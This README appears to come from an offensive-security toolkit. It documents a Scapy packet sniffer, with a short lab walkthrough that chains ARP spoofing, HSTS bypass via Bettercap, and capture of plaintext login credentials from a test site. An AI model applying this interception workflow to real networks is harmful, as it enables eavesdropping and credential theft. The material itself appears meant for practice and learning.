# Packet sniffer

Can be used to sniff packets on an interface of the hacking machine.

## Requirements

* Root access
* Python 3
* Scapy

## Usage

```shell
usage: packet_sniffer.py [-h] [-i INTERFACE]

Packet sniffer

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        interface to use

Example: 
            packet_sniffer.py -i eth0
            packet_sniffer.py          # with default eth0
```
## Kicking the tyres

Become MitM by running the [arp_spoofer](/arp_spoofer)

```shell
@kali:~$ sudo python3 arp_spoofer.py
[sudo] password for <user>: 
[+] Setting forward
[+] Packets sent: 118
```

Start the sniffer:

```shell
@kali:~$ sudo python3 packet_sniffer.py
[sudo] password for <user>: 

```

Go to sites (for example http://testphp.vulnweb.com/login.php) in browser. If you wish to see results for https sites, fire up the Bettercap hstshijack caplet.

View results in terminal where sniffer runs:

```shell
@kali:~$ sudo python3 packet_sniffer.py
[sudo] password for <user>: 
[+] HTTP Request >> testphp.vulnweb.com/userinfo.php

[+] Possible username/password >> b'uname=test&pass=test'

```

## Troubleshooting

* [ImportError on Scapy](https://github.com/tymyrddin/ymrir/wiki/scapy.md)
* [Bettercap sslstrip not working](https://github.com/tymyrddin/ymrir/wiki/bettercap.md)
* [Undesired HTTPS redirects](https://github.com/tymyrddin/ymrir/wiki/https-browser.md)
* [Correctly configured HSTS](https://github.com/tymyrddin/ymrir/wiki/hsts.md)
